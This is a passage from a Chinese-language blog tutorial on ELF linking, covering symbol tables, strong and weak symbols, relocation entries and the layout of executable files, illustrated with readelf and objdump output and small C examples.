<figcaption aria-hidden="true">image-20220510203006548</figcaption>
</figure>
<p>如图被data节表管理的data节中只有10,20,40这三个已经赋值的全局或者静态变量</p>
<h4 id="bss"><code>.bss</code></h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ 4] .bss              NOBITS           0000000000000000  00000068</span><br><span class="line">     0000000000000000  0000000000000000  WA       0     0     1</span><br></pre></td></tr></table></figure>
<p>该部分只有一个节表表项,在节中实际不存在,只是起一个占位符的作用</p>
<p>未初始化的静态变量或者初始化为<code>0</code>的全局或静态变量,当程序运行时才会给<code>bss</code>变量在内存分配空间并赋值0</p>
<p><code>COMMON</code>存放未初始化的全局变量,这和链接有关</p>
<h4 id="rodata"><code>.rodata</code></h4>
<p><code>printf</code>要打印的字符串字面值就存放在该区域</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220510203554082.png"
alt="image-20220510203554082" />
<figcaption aria-hidden="true">image-20220510203554082</figcaption>
</figure>
<p><code>.rel</code>开头的节及其他节</p>
<p><code>.rel</code>的节和重定位有关</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220510203810791.png"
alt="image-20220510203810791" />
<figcaption aria-hidden="true">image-20220510203810791</figcaption>
</figure>
<p>链接依赖于符号<code>.symtab</code>节管理符号</p>
<h3 id="symtab节"><code>.symtab</code>节</h3>
<p><code>main.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span>,<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> b=<span class="number">4</span>;</span><br><span class="line">    <span class="type">int</span> c=sum(a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sum.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只将<code>main.c</code>编译成<code>main.o</code>可重定位目标</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -Og -c -o main.o</span><br></pre></td></tr></table></figure>
<p>然后<code>readelf -s</code>观察符号表节</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/Linker# readelf -s main.o</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains 12 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS main.c</span><br><span class="line">     2: 0000000000000000     0 SECTION LOCAL  DEFAULT    1 </span><br><span class="line">     3: 0000000000000000     0 SECTION LOCAL  DEFAULT    3 </span><br><span class="line">     4: 0000000000000000     0 SECTION LOCAL  DEFAULT    4 </span><br><span class="line">     5: 0000000000000000     0 SECTION LOCAL  DEFAULT    6 </span><br><span class="line">     6: 0000000000000000     0 SECTION LOCAL  DEFAULT    7 </span><br><span class="line">     7: 0000000000000000     0 SECTION LOCAL  DEFAULT    8 </span><br><span class="line">     8: 0000000000000000     0 SECTION LOCAL  DEFAULT    5 </span><br><span class="line">     9: 0000000000000000    33 FUNC    GLOBAL DEFAULT    1 main</span><br><span class="line">    10: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    11: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">sum</span></span><br></pre></td></tr></table></figure>
<table>
<colgroup>
<col style="width: 2%" />
<col style="width: 2%" />
<col style="width: 22%" />
<col style="width: 2%" />
<col style="width: 11%" />
<col style="width: 10%" />
<col style="width: 2%" />
<col style="width: 25%" />
<col style="width: 20%" />
</colgroup>
<thead>
<tr>
<th>项目</th>
<th>Num</th>
<th>Value</th>
<th>Size</th>
<th>Type</th>
<th>Bind</th>
<th>Vis</th>
<th>Ndx</th>
<th>Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>意义</td>
<td>编号</td>
<td>符号在其所在节中,举例节首地址的偏移量</td>
<td>大小</td>
<td>类型(函数/对象等等)</td>
<td>属性,本地还是全局</td>
<td></td>
<td>section节索引,在section header table中确定</td>
<td>名称,这个字符串名称放在.strtab节中</td>
</tr>
</tbody>
</table>
<p><code>Ndx</code>中的值是该符号在本文件中的哪一节,<code>UND</code>则为本模块中引用的其他模块的符号</p>
<h3 id="符号和符号表">符号和符号表</h3>
<p><code>.o</code>目标模块都有一共符号表,其中包含该目标模块中定义和引用的符号信息</p>
<p>对于连接器来说有三种符号</p>
<p>1.本模块定义的全局符号,对其他模块可见</p>
<p>2.其他模块定义的全局符号,对本模块可见</p>
<p>3.本模块定义的静态符号,只对本模块可见</p>
<blockquote>
<p>static的作用类似于java中的private或者protected,而全局变量则相当于public修饰</p>
</blockquote>
<p>函数栈中的局部变量不会出现在符号表中,其符号由堆栈维护,或者说不需要符号.</p>
<p>每个符号都属于一个节</p>
<p>比如函数就属于text节,已初始化且不为0的全局变量属于.data节,未初始化的静态变量属于.bss节等等</p>
<blockquote>
<p><strong>只有.o可重定位目标模块中存在的</strong>,并且节头表.symtab中没有条目的三个伪节:</p>
<p>.ABS 不该被重定位的符号</p>
<p>.UNDEF 本模块中只有引用没有定义的符号</p>
<p><strong>.COMMON 未初始化的全局变量</strong></p>
</blockquote>
<blockquote>
<p>注意存放全局变量时,放在.COMMON和.bss的区别,static变量不会涉及链接问题,但是全局变量会</p>
<p>将未初始化的全局变量放到.COMMON,将已初始化为0的全局变量放到.bss,将已初始化不为零的全局变量放在data</p>
<p>这样做的目的和链接时符号的强弱性质有关,这都是后话了</p>
</blockquote>
<p>链接形成可执行目标文件之后这三个伪节就不复存在了</p>
<h3 id="符号解析">符号解析</h3>
<p>多个目标文件或者库还有命令行参数构成链接器的<strong>输入</strong></p>
<p>连接器在链接时,会给每个引用在其<strong>输入</strong>的一个模块的符号表中找到与该引用对应的符号定义</p>
<p>关键在于全局符号的引用解析</p>
<p>如果<strong>编译器</strong>遇到了一个引用并且在本模块中没有找到定义,则<strong>编译器</strong>会假设其定义在其他模块中,生成一共链接器符号表条目</p>
<p>如果链接器在所有输入的目标模块中都没有找到该引用的定义则报错</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>;<span class="comment">//func只是一个引用,在本模块中没有定义</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">   func();</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>链接报错:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ghX.o:main.c:(.text+0xe): undefined reference to `func<span class="string">&#x27;</span></span><br><span class="line"><span class="string">collect2.exe: error: ld returned 1 exit status</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">   func();</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;&#125;<span class="comment">//func在本模块中有定义</span></span><br></pre></td></tr></table></figure>
<p>此时链接不会发生报错</p>
</blockquote>
<p>如果链接器找到了多个定义,则按照下面三条规则处理多重定义符号名</p>
<blockquote>
<p>强符号:函数,已初始化的全局变量(data或者bss节)</p>
<p>弱符号:未初始化的全局变量,放在COMMON伪节</p>
<p><code>int a;</code>这就是一个弱符号</p>
<p><code>int a=0;</code>这就是一个强符号</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220520170252584.png"
alt="image-20220520170252584" />
<figcaption aria-hidden="true">image-20220520170252584</figcaption>
</figure>
<p>因此将全局变量按照是否初始化,被分到common还是data或者bss节</p>
<p>common中符号的在链接时会被作为弱符号</p>
<h3 id="重定位">重定位</h3>
<p>重定位的两个步骤</p>
<h4 id="重定位节">1.重定位节</h4>
<p>将所有输入的目标文件合并成一个文件,由于每个目标文件都有.data等节,因此需要合并每个目标文件中的相同节,形成一个文件</p>
<p>如此,所有的符号定义相对于该文件都有一个确定的偏移量位置,此时就可以给每个符号一个虚拟内存地址了</p>
<h4
id="重定位节中的符号引用"><strong>2.</strong>重定位节中的符号引用</h4>
<p>在1中我们已经给每个符号定义确定了一个绝对的虚拟内存地址,但是怎么让该符号的引用也知道应该引用这个绝对的虚拟内存地址?</p>
<p>本步骤就是让所有符号引用都有着落</p>
<blockquote>
<p>举个例子,<code>main.c</code>是这样写的:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>;<span class="comment">//声明一个函数符号引用</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"> 	func();</span><br><span class="line"> 	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>让编译停止在链接前,此时<code>func</code>函数对于<code>main</code>模块来说还只是一个符号引用,</p>
<p>对<code>main.o</code>反汇编之后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\desktop\os\Linker&gt; gcc main.c -O0 -c -o main.o</span><br><span class="line">PS C:\Users\86135\desktop\os\Linker&gt; objdump main.o -d </span><br><span class="line"></span><br><span class="line">main.o:     file format pe-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;main&gt;:</span><br><span class="line">0:   55                      push   %rbp</span><br><span class="line">1:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line">4:   48 83 ec 20             sub    $0x20,%rsp</span><br><span class="line">8:   e8 00 00 00 00          callq  d &lt;main+0xd&gt;</span><br><span class="line">d:   e8 00 00 00 00          callq  12 &lt;main+0x12&gt;</span><br><span class="line">12:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">17:   48 83 c4 20             add    $0x20,%rsp</span><br><span class="line">1b:   5d                      pop    %rbp</span><br><span class="line">1c:   c3                      retq</span><br><span class="line">1d:   90                      nop</span><br><span class="line">1e:   90                      nop</span><br><span class="line">1f:   90                      nop</span><br></pre></td></tr></table></figure>
<p>发现反汇编的代码中并没有出现func函数的影子,并且有两条很诡异的call指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8:   e8 00 00 00 00          callq  d &lt;main+0xd&gt;</span><br><span class="line">d:   e8 00 00 00 00          callq  12 &lt;main+0x12&gt;</span><br></pre></td></tr></table></figure>
<p>明明就在本函数之中,却还要<code>call</code>一下</p>
<p>这样写的原因是,目前本模块并不知道<code>func</code>的地址,因此指令中根本没法写<code>call</code>谁<code>e8 00 00 00 00</code>这里后面8个0就是未知地址,<code>e8</code>是只是<code>call</code>指令的操作码</p>
<p>这里写了两个不明所以的<code>call</code>指令,原因是,上面这个<code>8:   e8 00 00 00 00          callq  d &lt;main+0xd&gt;</code>在链接后调用的是<code>__main</code>函数,作用是进行一些初始化</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0000000000401650 &lt;__main&gt;:</span><br><span class="line">  401650:	8b 05 da 59 00 00    	mov    0x59da(%rip),%eax        # 407030 &lt;initialized&gt;</span><br><span class="line">  401656:	85 c0                	test   %eax,%eax</span><br><span class="line">  401658:	74 06                	je     401660 &lt;__main+0x10&gt;</span><br><span class="line">  40165a:	c3                   	retq   </span><br><span class="line">  40165b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  401660:	c7 05 c6 59 00 00 01 	movl   $0x1,0x59c6(%rip)        # 407030 &lt;initialized&gt;</span><br><span class="line">  401667:	00 00 00 </span><br><span class="line">  40166a:	e9 71 ff ff ff       	jmpq   4015e0 &lt;__do_global_ctors&gt;</span><br><span class="line">  40166f:	90                   	nop</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
</blockquote>
<p>下面这个才是<code>call func</code>,调用<code>func</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000401560</span> &lt;main&gt;:</span><br><span class="line">  <span class="number">401560</span>:	<span class="number">55</span>                   	push   %rbp</span><br><span class="line">  <span class="number">401561</span>:	<span class="number">48</span> <span class="number">89</span> e5             	mov    %rsp,%rbp</span><br><span class="line">  <span class="number">401564</span>:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">20</span>          	sub    $<span class="number">0x20</span>,%rsp</span><br><span class="line">  <span class="number">401568</span>:	e8 e3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401650</span> &lt;__main&gt;</span><br><span class="line">  <span class="number">40156</span>d:	e8 <span class="number">0</span>e <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401580</span> &lt;func&gt;</span><br><span class="line">  <span class="number">401572</span>:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">401577</span>:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">20</span>          	add    $<span class="number">0x20</span>,%rsp</span><br><span class="line">  <span class="number">40157b</span>:	<span class="number">5</span>d                   	pop    %rbp</span><br><span class="line">  <span class="number">40157</span>c:	c3                   	retq   </span><br><span class="line">  <span class="number">40157</span>d:	<span class="number">90</span>                   	nop</span><br><span class="line">  <span class="number">40157</span>e:	<span class="number">90</span>                   	nop</span><br><span class="line">  <span class="number">40157f</span>:	<span class="number">90</span>                   	nop</span><br></pre></td></tr></table></figure>
</blockquote>
<p>链接器依赖可<strong>重定位模块</strong>(<code>.o</code>)中的<strong>重定位条目</strong>实现该步骤</p>
<h5 id="重定位条目">重定位条目</h5>
<p>汇编器在遇到一个本模块中没有定义的符号引用时,就会为该符号引用创建一个重定位条目</p>
<p>代码的重定位条目存放在<code>.rel.text</code>节中</p>
<p><strong>已初始化</strong>数据的重定位条目存放在<code>.rel.data</code>节中</p>
<p>重定位条目结构定义:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220525095006902.png"
alt="image-20220525095006902" />
<figcaption aria-hidden="true">image-20220525095006902</figcaption>
</figure>
<blockquote>
<p>offset:引用的节偏移量</p>
<p>type:重定位类型(着重关心其中的两种)</p>
<p>symbol:符号表的下标</p>
<p>addend:修正参数</p>
</blockquote>
<p><code>R_X86_64_PC32</code>重定位一个使用32位PC相对地址的引用</p>
<blockquote>
<p>PC相对地址:某地址与当前PC值的距离</p>
</blockquote>
<p>32位<strong>相对地址</strong>加上当前PC值得到有效地址</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0000000000001139 &lt;func&gt;:</span><br><span class="line">    1139:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">    113d:	48 8d 3d c0 0e 00 00 	lea    0xec0(%rip),%rdi        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    1144:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">    1149:	e8 e2 fe ff ff       	call   1030 &lt;printf@plt&gt;</span><br><span class="line">    114e:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">    1152:	c3                   	ret    </span><br><span class="line">    </span><br><span class="line">0000000000001153 &lt;main&gt;:</span><br><span class="line">    1153:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">    1157:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">    115c:	e8 d8 ff ff ff       	call   1139 &lt;func&gt;</span><br><span class="line">    1161:	b8 00 00 00 00       	mov    $0x0,%eax</span><br></pre></td></tr></table></figure>
<p>比如当执行115c处的<code>115c: e8 d8 ff ff ff          call   1139 &lt;func&gt;</code>时</p>
<p>此时程序计数器指向下一条指令<code>PC=0x1161</code></p>
<p>操作码<code>e8</code>表示call</p>
<p>相对地址<code>d8 ff ff ff</code>按照小端模式存放,写成16进制数应该为<code>0xff ff ff d8=-40=-0x28</code></p>
<p>PC加上相对地址即<code>0x1161-0x28=0x1139</code>恰好为<code>0000000000001139 &lt;func&gt;:</code>的首条指令的地址</p>
</blockquote>
<p><code>R_x86_64_32</code>重定位一个使用32位<strong>绝对地址</strong>的引用</p>
<p>绝对寻址,直接在指令编码中给出有效地址</p>
<h5 id="重定位算法">重定位算法</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220527115221609.png"
alt="image-20220527115221609" />
<figcaption aria-hidden="true">image-20220527115221609</figcaption>
</figure>
<p>重定位算法也是比较容易理解的,</p>
<p>说了一个啥事呢?</p>
<p>现在各个模块的text合并成一个text节,所有符号都有一个重定位条目,记录了自己在本节中的偏移量(相对于节基地址的位置)</p>
<p>然后本节中的一个符号想要找另一个符号的位置</p>
<p>这就相当鱼一个数组arr中,要计算<code>arr[20]</code>和<code>arr[200]</code>的举例,直接用200-20=180,这里下标就是数组元素相对于数组基地址的偏移量</p>
<p>数组就相当于这一整个text节,元素相当于text节中的一个符号,下标相当于该符号相对于text</p>
<p>所有引用符号重定位之后,此时所有引用,所有符号
都有址可循,链接完全完成,形成可执行目标文件.out</p>
<h2 id="可执行目标文件.out">可执行目标文件<code>.out</code></h2>
<p>可执行目标文件通常以<code>.out</code>作为拓展名,或者根本就不写拓展名,反正linux上对拓展名没有windows上那么严格</p>
<h3 id="文件视图">文件视图</h3>
<p>完全链接之后,所有的目标模块都融洽地形成一个可执行目标文件,原来每个目标模块中都有<code>text,data</code>等节,在可执行目标文件中,每种节有且只有一个</p>
<p>可执行目标文件的格式:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220525095816498.png"
alt="image-20220525095816498" />
<figcaption aria-hidden="true">image-20220525095816498</figcaption>
</figure>
<p>ELF头从0开始,这并不意味着ELF在真正执行的时候,起运行地址空间从0开始.</p>
<p><code>.init</code>节是一个小型的代码段,里面就一个小函数<code>_init</code>作用是进行一些初始化,具体初始化了啥我不知道,也不是学这一部分所应关心的重点</p>
<p>用010editor elf模板观察一个可执行目标文件</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220525143339664.png"
alt="image-20220525143339664" />
<figcaption aria-hidden="true">image-20220525143339664</figcaption>
</figure>
<p><code>elf_header</code>的作用和<code>.o</code>可重定位目标模块中的类似,作用是声明ELF魔数,规定后续各部分的偏移量和大小</p>
<h3 id="program_header程序头"><code>program_header</code>程序头</h3>
<p>作用是规定</p>
<p>1.各节在本可执行目标文件中的偏移,</p>
<p>2.虚拟内存地址,</p>
<p>3.对齐要求,</p>
<p>4.本目标文件中的段大小,</p>
<p>5.实际执行时内存中的段大小,</p>
<p>6.运行时的读写执行权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/linkage]</span><br><span class="line">└─$ objdump -h prog</span><br><span class="line"></span><br><span class="line">prog:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">  0 .interp       0000001c  0000000000000318  0000000000000318  00000318  2**0</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  1 .note.gnu.property 00000020  0000000000000338  0000000000000338  00000338  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  2 .note.gnu.build-id 00000024  0000000000000358  0000000000000358  00000358  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  3 .note.ABI-tag 00000020  000000000000037c  000000000000037c  0000037c  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  4 .gnu.hash     00000024  00000000000003a0  00000000000003a0  000003a0  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  5 .dynsym       00000090  00000000000003c8  00000000000003c8  000003c8  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  6 .dynstr       0000007d  0000000000000458  0000000000000458  00000458  2**0</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  7 .gnu.version  0000000c  00000000000004d6  00000000000004d6  000004d6  2**1</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  8 .gnu.version_r 00000020  00000000000004e8  00000000000004e8  000004e8  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  9 .rela.dyn     000000c0  0000000000000508  0000000000000508  00000508  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line"> 10 .init         00000017  0000000000001000  0000000000001000  00001000  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line"> 11 .plt          00000010  0000000000001020  0000000000001020  00001020  2**4</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line"> 12 .plt.got      00000008  0000000000001030  0000000000001030  00001030  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line"> 13 .text         00000171  0000000000001040  0000000000001040  00001040  2**4</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line"> 14 .fini         00000009  00000000000011b4  00000000000011b4  000011b4  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line"> 15 .rodata       00000004  0000000000002000  0000000000002000  00002000  2**2</span><br><span class="line">0000000000003e20  00002e20  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> 20 .dynamic      000001b0  0000000000003e28  0000000000003e28  00002e28  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> 21 .got          00000028  0000000000003fd8  0000000000003fd8  00002fd8  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> 22 .got.plt      00000018  0000000000004000  0000000000004000  00003000  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> 23 .data         00000010  0000000000004018  0000000000004018  00003018  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> 24 .bss          00000008  0000000000004028  0000000000004028  00003028  2**0</span><br><span class="line">                  ALLOC</span><br><span class="line"> 25 .comment      0000001f  0000000000000000  0000000000000000  00003028  2**0</span><br><span class="line">                  CONTENTS, READONLY</span><br></pre></td></tr></table></figure>
<h3 id="运行视图">运行视图</h3>
<p>在<code>shell</code>上,<code>./prog</code>命令即可加载并执行可执行目标文件<code>prog</code></p>
<p>实际上是<code>shell</code>调用<code>execve</code>函数来调用加载器,加载器是操作系统的组成部分.</p>
<p>加载器把<code>prog</code>的所有代码和数据从磁盘拷贝到内存,然后跳转到程序的第一条指令,然后控制转移到该程序,程序执行.这个过程叫做加载</p>
<p>至于加载器究竟干了啥,我不知道,现在也不想知道</p>
<p>加载完成后,程序在内存中的映像图是这样的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220525145002132.png"
alt="image-20220525145002132" />
<figcaption aria-hidden="true">image-20220525145002132</figcaption>
</figure>
<blockquote>
<p>其中忽略了一些无关紧要的信息,比如</p>
<p>1.各段都有自己的对齐要求,但是图上都画的紧挨着.实际上有可能"相邻"两段之间有一些没有意义的空隙,当程序错误执行到这些空当时就会触发段错误</p>
<p>2.没有表现出地址空间布局随机化.ASLR的作用是对抗pwn攻击的,在做一些简单的pwn题目时,一个变量,一个函数的地址都是确定的,使用ida打开看到了,那么就可以确定下一次运行时那个函数,那个变量还是在那个位置.而开启ASLR之后每次运行,同一个变量会有不同的地址.</p>
<blockquote>
<p>但是仍然可以确定的是,两个变量,变量和函数,函数之间的相对位置都是不变的,就相当于把整个村从城南搬到城北,李四还是知道张三住哪里,走多远到张三家</p>
</blockquote>
</blockquote>
<p>运行时视图没有"<code>section</code>"这种说法了,类似的概念叫"<code>segment</code>"</p>
<p>比如只读代码段(由原来的<code>.init,.text,.rodata</code>节组成)</p>
<p>性质类似的节(比如只读数据和代码都不可执行,合并到一个段</p>
<p>段也有类似于节的属性,比如读写执行权限</p>
<p>如果企图在只读代码段修改或写入东西</p>
